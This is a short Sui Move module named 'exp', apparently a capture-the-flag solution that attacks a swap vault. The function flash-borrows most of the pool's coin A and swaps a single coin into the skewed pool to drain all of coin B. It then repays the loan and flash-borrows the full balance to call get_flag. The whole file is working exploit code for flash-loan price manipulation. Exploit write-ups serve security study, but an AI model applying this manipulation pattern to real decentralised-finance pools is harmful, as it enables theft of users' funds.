/// Module: exp
module exp::exp {

    use sui::tx_context::TxContext;
    use sui::balance::{Self, Balance};
    use sui::coin::{Self, Coin};

    use swap::vault::{Self, Vault,swap_a_to_b};

    public entry fun exp1<A,B>(vault: &mut Vault<A,B>, coina:Coin<A>, ctx: &mut TxContext) {
        //in vault, A:100,B:100

        //flashloan 99 coina
        let (coin_a, coin_b, receipt) = vault::flash(vault, 99, false, ctx);
        //in vault, A:1,B:100

        let mut input_balance= coin::into_balance(coina);//10
        let coinb = swap_a_to_b(vault,coin::from_balance(balance::split(&mut input_balance,1),ctx), ctx);
        transfer::public_transfer(coinb, tx_context::sender(ctx));
        let change = coin::from_balance(input_balance, ctx);
        transfer::public_transfer(change, tx_context::sender(ctx));
        //in vault, A:2,B:0

        
        //repay 99 coina
        vault::repay_flash(vault, coin_a, coin_b, receipt);
        //in vault, A:101,B:0

        // flashloan all
        let (coin_a, coin_b, receipt) = vault::flash(vault, 101, false, ctx);

        vault::get_flag(vault, ctx);
        vault::repay_flash(vault, coin_a, coin_b, receipt);
    
    }

}
